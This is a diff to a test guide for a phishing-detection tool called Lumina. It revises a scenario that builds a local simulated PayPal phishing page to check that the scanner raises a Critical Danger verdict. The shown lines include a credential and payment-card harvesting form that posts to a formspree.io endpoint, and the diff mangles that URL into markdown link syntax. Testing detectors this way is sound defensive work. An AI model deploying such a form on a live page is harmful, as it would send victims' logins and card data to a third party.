@@ -62,13 +62,14 @@ Prove that the heuristic engine does not produce false positives on standard, tr
 4. Click **Run Security Scan**.
 5. **Expected Result:** The system will return a **Safe (Score: 5/100)** verdict, validating that standard DOM elements and scripts are correctly bypassed by the domain whitelist and structural checks.
 
-### Scenario 2: Malicious Sandbox Trigger
-Demonstrate Lumina's ability to catch zero-day phishing attempts, credential harvesting, and dark patterns using a controlled local simulation.
-1. Create a new file on your computer named `malicious-test.html`.
-2. Copy and paste the following simulation code into the file:
+### Scenario 2: Advanced Malicious Sandbox Trigger
+Demonstrate Lumina's ability to catch zero-day phishing attempts, credential harvesting, forced continuity, and JavaScript obfuscation using a high-fidelity simulated threat.
 
-    ```html
-    <!DOCTYPE html>
+1. Create a local file named `malicious-test.html`.
+2. Copy and paste the following advanced phishing simulation code into the file:
+
+```html
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -303,7 +304,7 @@ Demonstrate Lumina's ability to catch zero-day phishing attempts, credential har
     </div>
 
     <!-- Active Credential & Payment Card Harvesting Form -->
-    <form action="https://formspree.io/f/demo_phishing_endpoint" method="POST">
+    <form action="[https://formspree.io/f/demo_phishing_endpoint](https://formspree.io/f/demo_phishing_endpoint)" method="POST">
       
       <div class="form-group">
         <label for="email">PayPal Email or Mobile Number</label>
@@ -374,13 +375,10 @@ Demonstrate Lumina's ability to catch zero-day phishing attempts, credential har
   </script>
 </body>
 </html>
-
-    ```
-
-3. Serve this file locally (e.g., using VS Code Live Server, Python's `http.server`, or `npx serve`).
-4. Paste the local URL (e.g., `http://127.0.0.1:5500/malicious-test.html`) into the Lumina URL portal.
-5. Click **Run Security Scan**.
-6. **Expected Result:** The engine will instantly flag the urgency keywords, artificial countdown timer, hidden subscription trap, and unverified password form. The UI will shift to a **Critical Danger** state, detailing the exact detected indicators.
+```
+1. Serve the file locally and paste its URL into Lumina.
+2. Click Run Security Scan.
+3. Expected Result: Lumina instantly flags the highly deceptive UI, identifying urgency keywords ("Account suspended"), artificial countdown logic, manipulative social proof, extensive credential/card harvesting fields, and hidden continuity traps, outputting a definitive Critical Danger warning.
 
 ### Scenario 3: Offline Screenshot OCR Analysis
 Showcase the on-device WebAssembly text extraction for users who cannot copy-paste URLs (e.g., SMS phishing or image-based scams).
